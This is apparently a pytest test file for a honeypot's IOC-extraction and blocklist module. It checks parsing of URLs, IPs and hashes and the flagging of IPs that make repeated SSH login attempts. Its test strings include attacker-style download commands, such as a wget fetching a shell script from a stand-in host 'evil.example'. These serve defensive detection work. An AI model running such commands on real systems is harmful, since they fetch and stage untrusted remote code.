from honeypot.events import Event, AUTH, CONNECT, COMMAND, HTTP_REQUEST
from honeypot.storage.db import Storage
from honeypot.analysis.ioc import extract_iocs, collect, bad_ips, save_blocklist


def test_extract():
    r = extract_iocs("wget http://evil.example/x.sh -O /tmp/x; ping 10.0.0.5 999.1.1.1")
    assert r["urls"] == {"http://evil.example/x.sh"}
    assert r["domains"] == {"evil.example"}
    assert r["ips"] == {"10.0.0.5"}  # 999.1.1.1 не настоящий ip


def test_url_with_ip_and_hash():
    r = extract_iocs("curl http://1.2.3.4:8080/a; md5 d41d8cd98f00b204e9800998ecf8427e")
    assert "1.2.3.4" in r["ips"]
    assert r["domains"] == set()
    assert "d41d8cd98f00b204e9800998ecf8427e" in r["hashes"]


def test_collect(tmp_path):
    db = Storage(tmp_path / "t.db")
    db.save(Event("ssh", COMMAND, "1.1.1.1", payload={"cmd": "wget http://a.example/b"}))
    db.save(Event("http", HTTP_REQUEST, "2.2.2.2",
                  payload={"path": "/", "query": "u=http%3A%2F%2Fa.example%2Fb", "body": ""}))
    c = collect(db)
    assert c["urls"]["http://a.example/b"] == 2
    assert c["domains"]["a.example"] == 2


def test_blocklist(tmp_path):
    db = Storage(tmp_path / "t.db")
    for _ in range(3):
        db.save(Event("ssh", AUTH, "1.1.1.1", session_id="a"))  # перебор паролей
    db.save(Event("ssh", CONNECT, "2.2.2.2", session_id="b"))   # просто скан
    assert bad_ips(db) == ["1.1.1.1"]

    path = tmp_path / "block.txt"
    assert save_blocklist(db, path) == 1
    assert path.read_text(encoding="utf-8") == "1.1.1.1\n"